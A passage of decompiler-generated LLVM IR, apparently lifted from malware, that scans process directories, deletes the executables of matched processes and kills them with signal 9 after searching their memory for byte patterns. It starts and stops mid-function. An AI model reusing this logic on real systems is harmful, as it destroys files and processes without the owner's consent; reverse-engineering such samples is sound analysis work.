  %v2_fa04122 = icmp eq %dirent* %v3_fa00119, null
  br i1 %v2_fa04122, label %dec_label_pc_fa8c, label %dec_label_pc_fa0c.preheader

dec_label_pc_fa0c.preheader:                      ; preds = %dec_label_pc_f9f4, %dec_label_pc_f9fc.backedge
  %v0_fa0c134.in = phi %dirent* [ %v3_fa00, %dec_label_pc_f9fc.backedge ], [ %v3_fa00119, %dec_label_pc_f9f4 ]
  %stack_var_-8420.1123 = phi i32 [ %stack_var_-8420.1.be, %dec_label_pc_f9fc.backedge ], [ %stack_var_-8420.0, %dec_label_pc_f9f4 ]
  br label %dec_label_pc_fa0c

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_fa0c.preheader, %dec_label_pc_fa74
  %v0_fa1c.in = phi %dirent* [ %v3_fa80, %dec_label_pc_fa74 ], [ %v0_fa0c134.in, %dec_label_pc_fa0c.preheader ]
  %stack_var_-8420.2 = phi i32 [ %v1_fa30, %dec_label_pc_fa74 ], [ %stack_var_-8420.1123, %dec_label_pc_fa0c.preheader ]
  %v0_fa1c = ptrtoint %dirent* %v0_fa1c.in to i32
  %v1_fa0c = add i32 %v0_fa1c, 11
  %v2_fa0c = inttoptr i32 %v1_fa0c to i8*
  %v3_fa0c = load i8, i8* %v2_fa0c, align 1
  %v4_fa0c = zext i8 %v3_fa0c to i32
  %v1_fa10 = add nsw i32 %v4_fa0c, -48
  store i32 %v1_fa10, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_fa10, 9
  br i1 %tmp, label %dec_label_pc_f9fc.backedge, label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_fa0c
  store i32 %v1_fa0c, i32* @r6, align 4
  %v4_fa24 = call i32 @atoi(i8* %v2_fa0c)
  %v0_fa2c = load i32, i32* @r5, align 4
  %v1_fa30 = add i32 %stack_var_-8420.2, 1
  store i32 %v1_fa30, i32* %r2.global-to-local, align 4
  store i32 %v4_fa24, i32* @r7, align 4
  %v5_fa3c = icmp slt i32 %v0_fa2c, %v4_fa24
  %v2_fa9c = call i32 @time(i32* null)
  br i1 %v5_fa3c, label %dec_label_pc_fa98, label %dec_label_pc_fa40

dec_label_pc_fa40:                                ; preds = %dec_label_pc_fa1c
  %v0_fa48 = load i32, i32* @r4, align 4
  %v2_fa48 = sub i32 %v2_fa9c, %v0_fa48
  %v7_fa50 = icmp slt i32 %v2_fa48, 601
  br i1 %v7_fa50, label %dec_label_pc_fa58, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_fa40
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_f9fc.backedge

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa40
  %v0_fa58 = load i32, i32* @r7, align 4
  %v7_fa5c = icmp slt i32 %v0_fa58, 401
  br i1 %v7_fa5c, label %dec_label_pc_f9fc.backedge, label %dec_label_pc_fa60

dec_label_pc_fa60:                                ; preds = %dec_label_pc_fa58
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_fa68 = urem i32 %v1_fa30, 10
  %v2_fa6c = icmp eq i32 %v2_fa68, 0
  br i1 %v2_fa6c, label %dec_label_pc_fa74, label %dec_label_pc_f9fc.backedge

dec_label_pc_fa74:                                ; preds = %dec_label_pc_fa60
  %v1_fa78 = call i32 @sleep(i32 1)
  %v0_fa7c = load i32, i32* %sl.global-to-local, align 4
  %v1_fa7c = inttoptr i32 %v0_fa7c to %__dirstream*
  %v3_fa80 = call %dirent* @readdir(%__dirstream* %v1_fa7c)
  %v2_fa84 = icmp eq %dirent* %v3_fa80, null
  br i1 %v2_fa84, label %dec_label_pc_fa8c, label %dec_label_pc_fa0c

dec_label_pc_fa8c:                                ; preds = %dec_label_pc_f9fc.backedge, %dec_label_pc_fa74, %dec_label_pc_f9f4
  %stack_var_-8420.3 = phi i32 [ %stack_var_-8420.0, %dec_label_pc_f9f4 ], [ %v1_fa30, %dec_label_pc_fa74 ], [ %stack_var_-8420.1.be, %dec_label_pc_f9fc.backedge ]
  %v0_fa8c = load i32, i32* %sl.global-to-local, align 4
  %v1_fa8c = inttoptr i32 %v0_fa8c to %__dirstream*
  %v3_fa90 = call i32 @closedir(%__dirstream* %v1_fa8c)
  br label %dec_label_pc_f9d4

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fa1c
  %v1_faa8 = call i32 @function_13074(i32 6)
  %v1_fab0 = call i32 @function_13074(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_fabc = call i32 @function_12f90(i32 6, i32* null)
  store i32 %v3_fabc, i32* %r1.global-to-local, align 4
  store i32 %v2_fac8, i32* @r0, align 4
  %v3_facc = call i32 @function_139c4(i8* %v2_facc, i32 %v3_fabc)
  store i32 %v2_fac8, i32* %r3.global-to-local, align 4
  %v2_fad8 = add i32 %v3_facc, %v2_fac8
  store i32 %v2_fad8, i32* %r5.global-to-local, align 4
  %v0_fadc = load i32, i32* @r6, align 4
  store i32 %v0_fadc, i32* %r1.global-to-local, align 4
  store i32 %v2_fad8, i32* @r0, align 4
  %v2_fae4 = inttoptr i32 %v2_fad8 to i8*
  %v3_fae4 = call i32 @function_139c4(i8* %v2_fae4, i32 %v0_fadc)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_faf4 = call i32 @function_12f90(i32 7, i32* null)
  store i32 %v3_faf4, i32* %r1.global-to-local, align 4
  %v0_fafc = load i32, i32* %r5.global-to-local, align 4
  %v2_fafc = add i32 %v3_fae4, %v0_fafc
  store i32 %v2_fafc, i32* @r0, align 4
  %v2_fb00 = inttoptr i32 %v2_fafc to i8*
  %v3_fb00 = call i32 @function_139c4(i8* %v2_fb00, i32 %v3_faf4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_fb0c = call i32 @function_12f90(i32 6, i32* null)
  store i32 %v3_fb0c, i32* %r1.global-to-local, align 4
  store i32 %v2_fb18, i32* @r0, align 4
  %v3_fb1c = call i32 @function_139c4(i8* %v2_fb1c, i32 %v3_fb0c)
  %v2_fb28 = add i32 %v3_fb1c, %v2_fb18
  store i32 %v2_fb28, i32* @r5, align 4
  %v0_fb2c = load i32, i32* @r6, align 4
  store i32 %v0_fb2c, i32* %r1.global-to-local, align 4
  store i32 %v2_fb28, i32* @r0, align 4
  %v2_fb34 = inttoptr i32 %v2_fb28 to i8*
  %v3_fb34 = call i32 @function_139c4(i8* %v2_fb34, i32 %v0_fb2c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_fb34, i32* @r4, align 4
  %v3_fb44 = call i32 @function_12f90(i32 11, i32* null)
  store i32 %v3_fb44, i32* %r1.global-to-local, align 4
  %v0_fb4c = load i32, i32* @r5, align 4
  %v1_fb4c = load i32, i32* @r4, align 4
  %v2_fb4c = add i32 %v1_fb4c, %v0_fb4c
  store i32 %v2_fb4c, i32* @r0, align 4
  %v2_fb50 = inttoptr i32 %v2_fb4c to i8*
  %v3_fb50 = call i32 @function_139c4(i8* %v2_fb50, i32 %v3_fb44)
  %v1_fb58 = call i32 @function_12fbc(i32 6)
  %v1_fb60 = call i32 @function_12fbc(i32 7)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_fb74 = load i32, i32* %stack_var_-8428, align 4
  %v3_fb74 = inttoptr i32 %v2_fb74 to i8*
  store i32 %v2_fb74, i32* %r1.global-to-local, align 4
  %v7_fb78 = call i32 @readlink(i8* %v2_facc, i8* %v3_fb74, i32 4095)
  %v7_fb80 = icmp eq i32 %v7_fb78, -1
  store i32 %v7_fb78, i32* @r5, align 4
  store i32 -4276, i32* %r2.global-to-local, align 4
  br i1 %v7_fb80, label %dec_label_pc_fc48, label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fa98
  store i32 %v2_fb94, i32* %r1.global-to-local, align 4
  %v2_fb98 = add i32 %v7_fb78, %v2_fb94
  store i32 %v2_fb98, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_fba0 = add i32 %v2_fb98, -4276
  %v5_fba0 = inttoptr i32 %v4_fba0 to i8*
  store i8 0, i8* %v5_fba0, align 1
  %v1_fba8 = call i32 @function_13074(i32 10)
  %v0_fbac = load i32, i32* @r4, align 4
  store i32 %v0_fbac, i32* %r1.global-to-local, align 4
  %v2_fbb4 = inttoptr i32 %v0_fbac to i32*
  %v3_fbb4 = call i32 @function_12f90(i32 10, i32* %v2_fbb4)
  %v0_fbb8 = load i32, i32* @r5, align 4
  %v1_fbb8 = add i32 %v0_fbb8, -1
  store i32 %v1_fbb8, i32* @r1, align 4
  store i32 %v3_fbb4, i32* %r2.global-to-local, align 4
  %v2_fbc0 = load i32, i32* %stack_var_-8428, align 4
  %v3_fbc4 = inttoptr i32 %v2_fbc0 to i8*
  %v4_fbc4 = call i32 @function_13cf0(i8* %v3_fbc4, i32 %v1_fbb8, i32 %v3_fbb4)
  %v7_fbc8 = icmp eq i32 %v4_fbc4, -1
  br i1 %v7_fbc8, label %dec_label_pc_fbe4, label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fb90
  %v2_fbd0 = load i32, i32* %stack_var_-8428, align 4
  %v3_fbd0 = inttoptr i32 %v2_fbd0 to i8*
  %v3_fbd4 = call i32 @unlink(i8* %v3_fbd0)
  %v0_fbd8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_fbe0 = call i32 @kill(i32 %v0_fbd8, i32 9)
  br label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fb90, %dec_label_pc_fbd0
  %v1_fbe8 = call i32 @function_12fbc(i32 10)
  %v0_fbec = call i32 @getpid()
  %v0_fbf0 = load i32, i32* @r7, align 4
  %v9_fbf0 = icmp eq i32 %v0_fbf0, %v0_fbec
  br i1 %v9_fbf0, label %dec_label_pc_fc1c, label %dec_label_pc_fbf8

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fbe4
  %v0_fbf8 = call i32 @getppid()
  %v0_fbfc = load i32, i32* @r7, align 4
  %v9_fbfc = icmp eq i32 %v0_fbfc, %v0_fbf8
  br i1 %v9_fbfc, label %dec_label_pc_fc1c, label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbf8
  store i32 ptrtoint (i8** @global_var_1cd4c.159 to i32), i32* %r2.global-to-local, align 4
  %v2_fc08 = load i32, i32* %stack_var_-8428, align 4
  %v2_fc0c = load i8*, i8** @global_var_1cd4c.159, align 4
  %v3_fc0c = ptrtoint i8* %v2_fc0c to i32
  store i32 %v3_fc0c, i32* %r1.global-to-local, align 4
  %v3_fc10 = inttoptr i32 %v2_fc08 to i8*
  %v4_fc10 = call i32 @function_13d7c(i8* %v3_fc10, i32 %v3_fc0c)
  %v2_fc14 = icmp eq i32 %v4_fc10, 0
  br i1 %v2_fc14, label %dec_label_pc_fc28, label %dec_label_pc_fc04.dec_label_pc_fc1c_crit_edge

dec_label_pc_fc04.dec_label_pc_fc1c_crit_edge:    ; preds = %dec_label_pc_fc04
  %v0_fc20.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fc1c

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc04.dec_label_pc_fc1c_crit_edge, %dec_label_pc_fbf8, %dec_label_pc_fbe4
  %v0_fc20 = phi i32 [ %v0_fc20.pre, %dec_label_pc_fc04.dec_label_pc_fc1c_crit_edge ], [ %v0_fbf8, %dec_label_pc_fbf8 ], [ %v0_fbec, %dec_label_pc_fbe4 ]
  store i32 %v2_fa9c, i32* @r4, align 4
  store i32 %v0_fc20, i32* @r5, align 4
  br label %dec_label_pc_f9fc.backedge

dec_label_pc_f9fc.backedge:                       ; preds = %dec_label_pc_fa60, %dec_label_pc_fa58, %dec_label_pc_fa0c, %dec_label_pc_fc1c, %dec_label_pc_fecc, %.thread11
  %stack_var_-8420.1.be = phi i32 [ %v1_fa30, %dec_label_pc_fecc ], [ %v1_fa30, %dec_label_pc_fc1c ], [ %v1_fa30, %.thread11 ], [ %stack_var_-8420.2, %dec_label_pc_fa0c ], [ %v1_fa30, %dec_label_pc_fa58 ], [ %v1_fa30, %dec_label_pc_fa60 ]
  %v0_f9fc = load i32, i32* %sl.global-to-local, align 4
  %v1_f9fc = inttoptr i32 %v0_f9fc to %__dirstream*
  %v3_fa00 = call %dirent* @readdir(%__dirstream* %v1_f9fc)
  %v2_fa04 = icmp eq %dirent* %v3_fa00, null
  br i1 %v2_fa04, label %dec_label_pc_fa8c, label %dec_label_pc_fa0c.preheader

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fc04
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_fc2c = load i32, i32* %stack_var_-8428, align 4
  %v3_fc2c = inttoptr i32 %v2_fc2c to i8*
  %v4_fc30 = call i32 (i8*, i32, ...) @open(i8* %v3_fc2c, i32 0)
  %v7_fc34 = icmp eq i32 %v4_fc30, -1
  store i32 %v4_fc30, i32* @r4, align 4
  br i1 %v7_fc34, label %dec_label_pc_ff00, label %dec_label_pc_fc40

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc28, %dec_label_pc_ff00
  %v0_fc40 = phi i32 [ %v4_fc30, %dec_label_pc_fc28 ], [ %v0_fc40.pre, %dec_label_pc_ff00 ]
  %v1_fc44 = call i32 @close(i32 %v0_fc40)
  br label %dec_label_pc_fc48

dec_label_pc_fc48:                                ; preds = %dec_label_pc_fa98, %dec_label_pc_fc40
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_fc54 = call i32 (i8*, i32, ...) @open(i8* %v2_facc, i32 0)
  %v7_fc58 = icmp eq i32 %v4_fc54, -1
  br i1 %v7_fc58, label %dec_label_pc_fecc, label %dec_label_pc_fc64

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc48
  %v1_fc68 = call i32 @function_13074(i32 12)
  %v1_fc70 = call i32 @function_13074(i32 13)
  %v1_fc78 = call i32 @function_13074(i32 14)
  %v1_fc80 = call i32 @function_13074(i32 15)
  %v1_fc88 = call i32 @function_13074(i32 16)
  store i32 %v2_fc8c, i32* %r1.global-to-local, align 4
  %v3_fc94 = call i32 @function_12f90(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_fc9c, i32* %r1.global-to-local, align 4
  store i32 %v3_fc94, i32* @r5, align 4
  %v3_fca8 = call i32 @function_12f90(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_fcb0, i32* %r1.global-to-local, align 4
  store i32 %v3_fca8, i32* @r6, align 4
  %v3_fcbc = call i32 @function_12f90(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_fcc4, i32* %r1.global-to-local, align 4
  store i32 %v3_fcbc, i32* %sb.global-to-local, align 4
  %v3_fcd0 = call i32 @function_12f90(i32 15, i32* nonnull %stack_var_-40)
  store i32 %v3_fcd0, i32* %fp.global-to-local, align 4
  store i32 %v2_fcdc, i32* %r1.global-to-local, align 4
  %v3_fce4 = call i32 @function_12f90(i32 16, i32* nonnull %stack_var_-56)
  store i32 %v2_f904, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_fcf8114 = call i32 @read(i32 %v4_fc54, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp218 = icmp slt i32 %v4_fcf8114, 1
  br i1 %tmp218, label %dec_label_pc_ff10, label %dec_label_pc_fd04

dec_label_pc_fd04:                                ; preds = %dec_label_pc_fc64, %dec_label_pc_fcec.backedge
  %v0_fd8c105 = phi i32 [ %v4_fcf8, %dec_label_pc_fcec.backedge ], [ %v4_fcf8114, %dec_label_pc_fc64 ]
  store i32 %v2_f858, i32* %r3.global-to-local, align 4
  %v3_fd08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_fd08, i32* @r4, align 4
  %v5_fd10 = icmp slt i32 %v0_fd8c105, %v3_fd08
  br i1 %v5_fd10, label %dec_label_pc_fd20, label %dec_label_pc_fdcc.lr.ph

dec_label_pc_fdcc.lr.ph:                          ; preds = %dec_label_pc_fd04
  %v1_fdc470 = add i32 %v0_fd8c105, -1
  store i32 %v1_fdc470, i32* %r1.global-to-local, align 4
  %v0_fdcc.pre = load i32, i32* @r5, align 4
  %v1_fdd0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fdcc

dec_label_pc_fd20:                                ; preds = %dec_label_pc_fdc4.backedge, %dec_label_pc_fd04
  %v3_fd24 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_fd24, i32* @r4, align 4
  %v5_fd2c = icmp slt i32 %v0_fd8c105, %v3_fd24
  br i1 %v5_fd2c, label %dec_label_pc_fd3c, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_fd20
  %v1_fdf879 = add i32 %v0_fd8c105, -1
  store i32 %v1_fdf879, i32* %r1.global-to-local, align 4
  %v2_fdf880 = icmp eq i32 %v0_fd8c105, 0
  br i1 %v2_fdf880, label %dec_label_pc_fd3c, label %dec_label_pc_fe00.lr.ph

dec_label_pc_fe00.lr.ph:                          ; preds = %.thread28
  %v0_fe00.pre = load i32, i32* @r6, align 4
  %v1_fe04.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe00

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fdf8.backedge, %.thread28, %dec_label_pc_fd20
  store i32 %v2_f858, i32* %r1.global-to-local, align 4
  %v3_fd40 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_fd40, i32* @r4, align 4
  %v5_fd48 = icmp slt i32 %v0_fd8c105, %v3_fd40
  br i1 %v5_fd48, label %dec_label_pc_fd58, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_fd3c
  %v1_fe2c88 = add i32 %v0_fd8c105, -1
  store i32 %v1_fe2c88, i32* %r1.global-to-local, align 4
  %v2_fe2c89 = icmp eq i32 %v0_fd8c105, 0
  br i1 %v2_fe2c89, label %dec_label_pc_fd58, label %dec_label_pc_fe34.lr.ph

dec_label_pc_fe34.lr.ph:                          ; preds = %.thread37
  %v0_fe34.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_fe38.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe34

dec_label_pc_fd58:                                ; preds = %dec_label_pc_fe2c.backedge, %.thread37, %dec_label_pc_fd3c
  store i32 %v2_f858, i32* %r2.global-to-local, align 4
  %v3_fd5c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_fd5c, i32* @r4, align 4
  %v5_fd64 = icmp slt i32 %v0_fd8c105, %v3_fd5c
  br i1 %v5_fd64, label %dec_label_pc_fd74, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_fd58
  %v1_fe6097 = add i32 %v0_fd8c105, -1
  store i32 %v1_fe6097, i32* %r1.global-to-local, align 4
  %v2_fe6098 = icmp eq i32 %v0_fd8c105, 0
  br i1 %v2_fe6098, label %dec_label_pc_fd74, label %dec_label_pc_fe68.lr.ph

dec_label_pc_fe68.lr.ph:                          ; preds = %.thread46
  %v0_fe68.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_fe6c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe68

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fe60.backedge, %.thread46, %dec_label_pc_fd58
  store i32 %v2_f858, i32* %r3.global-to-local, align 4
  %v3_fd78 = load i32, i32* %stack_var_-56, align 4
  %v5_fd80 = icmp slt i32 %v0_fd8c105, %v3_fd78
  br i1 %v5_fd80, label %dec_label_pc_fcec.backedge, label %.thread52

dec_label_pc_fcec.backedge:                       ; preds = %dec_label_pc_fdb0, %.thread52, %dec_label_pc_fd74
  store i32 %v2_f904, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_fcf8 = call i32 @read(i32 %v4_fc54, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp219 = icmp slt i32 %v4_fcf8, 1
  br i1 %tmp219, label %dec_label_pc_ff10, label %dec_label_pc_fd04

.thread52:                                        ; preds = %dec_label_pc_fd74
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_fd8c107 = icmp eq i32 %v0_fd8c105, 0
  br i1 %v2_fd8c107, label %dec_label_pc_fcec.backedge, label %dec_label_pc_fd94.lr.ph

dec_label_pc_fd94.lr.ph:                          ; preds = %.thread52
  %v1_fd9c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fd94

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fdb0, %dec_label_pc_fd94.lr.ph
  %v0_fd8c.in = phi i32 [ %v0_fd8c105, %dec_label_pc_fd94.lr.ph ], [ %v0_fd8c, %dec_label_pc_fdb0 ]
  %v0_fdb0 = phi i32 [ 0, %dec_label_pc_fd94.lr.ph ], [ %v1_fdb0, %dec_label_pc_fdb0 ]
  %v0_fda4 = phi i32 [ 0, %dec_label_pc_fd94.lr.ph ], [ %v1_fda4., %dec_label_pc_fdb0 ]
  %v0_fd8c = add i32 %v0_fd8c.in, -1
  store i32 %v3_fce4, i32* %r3.global-to-local, align 4
  %v2_fd98 = add i32 %v0_fda4, %v3_fce4
  %v3_fd98 = inttoptr i32 %v2_fd98 to i8*
  %v4_fd98 = load i8, i8* %v3_fd98, align 1
  %v6_fd98 = zext i8 %v4_fd98 to i32
  store i32 %v6_fd98, i32* %r2.global-to-local, align 4
  %v2_fd9c = add i32 %v0_fdb0, %v1_fd9c.pre
  %v3_fd9c = inttoptr i32 %v2_fd9c to i8*
  %v4_fd9c = load i8, i8* %v3_fd9c, align 1
  %v6_fd9c = zext i8 %v4_fd9c to i32
  store i32 %v6_fd9c, i32* %r3.global-to-local, align 4
  %v9_fda0 = icmp eq i8 %v4_fd9c, %v4_fd98
  %v1_fda4 = add i32 %v0_fda4, 1
  %v1_fda4. = select i1 %v9_fda0, i32 %v1_fda4, i32 0
  store i32 %v1_fda4., i32* %r1.global-to-local, align 4
  br i1 %v9_fda0, label %dec_label_pc_fe88, label %dec_label_pc_fdb0

dec_label_pc_fdb0:                                ; preds = %dec_label_pc_fe88, %dec_label_pc_fd94
  %v1_fdb0 = add i32 %v0_fdb0, 1
  %v2_fd8c = icmp eq i32 %v0_fd8c, 0
  br i1 %v2_fd8c, label %dec_label_pc_fcec.backedge, label %dec_label_pc_fd94

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fdcc
  %v9_fdb8 = icmp eq i32 %v3_fd08, %v1_fdd8.
  br i1 %v9_fdb8, label %dec_label_pc_fe90, label %dec_label_pc_fdc4.backedge

dec_label_pc_fdc4.backedge:                       ; preds = %dec_label_pc_fdcc, %dec_label_pc_fdb8
  %storemerge126 = add i32 %storemerge126.in, 1
  %v1_fdc4 = add i32 %v0_fdc4, -1
  store i32 %v1_fdc4, i32* %r1.global-to-local, align 4
  %v2_fdc4 = icmp eq i32 %v0_fdc4, 0
  br i1 %v2_fdc4, label %dec_label_pc_fd20, label %dec_label_pc_fdcc

dec_label_pc_fdcc:                                ; preds = %dec_label_pc_fdc4.backedge, %dec_label_pc_fdcc.lr.ph
  %v0_fdc4 = phi i32 [ %v1_fdc470, %dec_label_pc_fdcc.lr.ph ], [ %v1_fdc4, %dec_label_pc_fdc4.backedge ]
  %storemerge126.in = phi i32 [ 0, %dec_label_pc_fdcc.lr.ph ], [ %storemerge126, %dec_label_pc_fdc4.backedge ]
  %v0_fdd8 = phi i32 [ 0, %dec_label_pc_fdcc.lr.ph ], [ %v1_fdd8., %dec_label_pc_fdc4.backedge ]
  %v2_fdcc = add i32 %v0_fdd8, %v0_fdcc.pre
  %v3_fdcc = inttoptr i32 %v2_fdcc to i8*
  %v4_fdcc = load i8, i8* %v3_fdcc, align 1
  %v6_fdcc = zext i8 %v4_fdcc to i32
  store i32 %v6_fdcc, i32* %r2.global-to-local, align 4
  %v2_fdd0 = add i32 %storemerge126.in, %v1_fdd0.pre
  %v3_fdd0 = inttoptr i32 %v2_fdd0 to i8*
  %v4_fdd0 = load i8, i8* %v3_fdd0, align 1
  %v6_fdd0 = zext i8 %v4_fdd0 to i32
  store i32 %v6_fdd0, i32* %r3.global-to-local, align 4
  %v9_fdd4 = icmp eq i8 %v4_fdd0, %v4_fdcc
  %v1_fdd8 = add i32 %v0_fdd8, 1
  %v1_fdd8. = select i1 %v9_fdd4, i32 %v1_fdd8, i32 0
  br i1 %v9_fdd4, label %dec_label_pc_fdb8, label %dec_label_pc_fdc4.backedge

dec_label_pc_fdec:                                ; preds = %dec_label_pc_fe00
  %v9_fdec = icmp eq i32 %v3_fd24, %v1_fe0c.
  br i1 %v9_fdec, label %dec_label_pc_fe90, label %dec_label_pc_fdf8.backedge

dec_label_pc_fdf8.backedge:                       ; preds = %dec_label_pc_fe00, %dec_label_pc_fdec
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_fdf8 = add i32 %v0_fdf8, -1
  store i32 %v1_fdf8, i32* %r1.global-to-local, align 4
  %v2_fdf8 = icmp eq i32 %v0_fdf8, 0
  br i1 %v2_fdf8, label %dec_label_pc_fd3c, label %dec_label_pc_fe00

dec_label_pc_fe00:                                ; preds = %dec_label_pc_fdf8.backedge, %dec_label_pc_fe00.lr.ph
  %v0_fdf8 = phi i32 [ %v1_fdf879, %dec_label_pc_fe00.lr.ph ], [ %v1_fdf8, %dec_label_pc_fdf8.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_fe00.lr.ph ], [ %storemerge125, %dec_label_pc_fdf8.backedge ]
  %v0_fe0c = phi i32 [ 0, %dec_label_pc_fe00.lr.ph ], [ %v1_fe0c., %dec_label_pc_fdf8.backedge ]
  %v2_fe00 = add i32 %v0_fe0c, %v0_fe00.pre
  %v3_fe00 = inttoptr i32 %v2_fe00 to i8*
  %v4_fe00 = load i8, i8* %v3_fe00, align 1
  %v6_fe00 = zext i8 %v4_fe00 to i32
  store i32 %v6_fe00, i32* %r2.global-to-local, align 4
  %v2_fe04 = add i32 %storemerge125.in, %v1_fe04.pre
  %v3_fe04 = inttoptr i32 %v2_fe04 to i8*
  %v4_fe04 = load i8, i8* %v3_fe04, align 1
  %v6_fe04 = zext i8 %v4_fe04 to i32
  store i32 %v6_fe04, i32* %r3.global-to-local, align 4
  %v9_fe08 = icmp eq i8 %v4_fe04, %v4_fe00
  %v1_fe0c = add i32 %v0_fe0c, 1
  %v1_fe0c. = select i1 %v9_fe08, i32 %v1_fe0c, i32 0
  br i1 %v9_fe08, label %dec_label_pc_fdec, label %dec_label_pc_fdf8.backedge

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe34
  %v9_fe20 = icmp eq i32 %v3_fd40, %v1_fe40.
  br i1 %v9_fe20, label %dec_label_pc_fe90, label %dec_label_pc_fe2c.backedge

dec_label_pc_fe2c.backedge:                       ; preds = %dec_label_pc_fe34, %dec_label_pc_fe20
  %storemerge124 = add i32 %storemerge124.in, 1
  %v1_fe2c = add i32 %v0_fe2c, -1
  store i32 %v1_fe2c, i32* %r1.global-to-local, align 4
  %v2_fe2c = icmp eq i32 %v0_fe2c, 0
  br i1 %v2_fe2c, label %dec_label_pc_fd58, label %dec_label_pc_fe34

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fe2c.backedge, %dec_label_pc_fe34.lr.ph
  %v0_fe2c = phi i32 [ %v1_fe2c88, %dec_label_pc_fe34.lr.ph ], [ %v1_fe2c, %dec_label_pc_fe2c.backedge ]
  %storemerge124.in = phi i32 [ 0, %dec_label_pc_fe34.lr.ph ], [ %storemerge124, %dec_label_pc_fe2c.backedge ]
  %v0_fe40 = phi i32 [ 0, %dec_label_pc_fe34.lr.ph ], [ %v1_fe40., %dec_label_pc_fe2c.backedge ]
  %v2_fe34 = add i32 %v0_fe40, %v0_fe34.pre
  %v3_fe34 = inttoptr i32 %v2_fe34 to i8*
  %v4_fe34 = load i8, i8* %v3_fe34, align 1
  %v6_fe34 = zext i8 %v4_fe34 to i32
  store i32 %v6_fe34, i32* %r2.global-to-local, align 4
  %v2_fe38 = add i32 %storemerge124.in, %v1_fe38.pre
  %v3_fe38 = inttoptr i32 %v2_fe38 to i8*
  %v4_fe38 = load i8, i8* %v3_fe38, align 1
  %v6_fe38 = zext i8 %v4_fe38 to i32
  store i32 %v6_fe38, i32* %r3.global-to-local, align 4
  %v9_fe3c = icmp eq i8 %v4_fe38, %v4_fe34
  %v1_fe40 = add i32 %v0_fe40, 1
  %v1_fe40. = select i1 %v9_fe3c, i32 %v1_fe40, i32 0
  br i1 %v9_fe3c, label %dec_label_pc_fe20, label %dec_label_pc_fe2c.backedge

dec_label_pc_fe54:                                ; preds = %dec_label_pc_fe68
  %v9_fe54 = icmp eq i32 %v3_fd5c, %v1_fe74.
  br i1 %v9_fe54, label %dec_label_pc_fe90, label %dec_label_pc_fe60.backedge

dec_label_pc_fe60.backedge:                       ; preds = %dec_label_pc_fe68, %dec_label_pc_fe54
  %storemerge = add i32 %storemerge.in, 1
  %v1_fe60 = add i32 %v0_fe60, -1
  store i32 %v1_fe60, i32* %r1.global-to-local, align 4
  %v2_fe60 = icmp eq i32 %v0_fe60, 0
  br i1 %v2_fe60, label %dec_label_pc_fd74, label %dec_label_pc_fe68

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe60.backedge, %dec_label_pc_fe68.lr.ph
  %v0_fe60 = phi i32 [ %v1_fe6097, %dec_label_pc_fe68.lr.ph ], [ %v1_fe60, %dec_label_pc_fe60.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_fe68.lr.ph ], [ %storemerge, %dec_label_pc_fe60.backedge ]
  %v0_fe74 = phi i32 [ 0, %dec_label_pc_fe68.lr.ph ], [ %v1_fe74., %dec_label_pc_fe60.backedge ]
  %v2_fe68 = add i32 %v0_fe74, %v0_fe68.pre
  %v3_fe68 = inttoptr i32 %v2_fe68 to i8*
  %v4_fe68 = load i8, i8* %v3_fe68, align 1
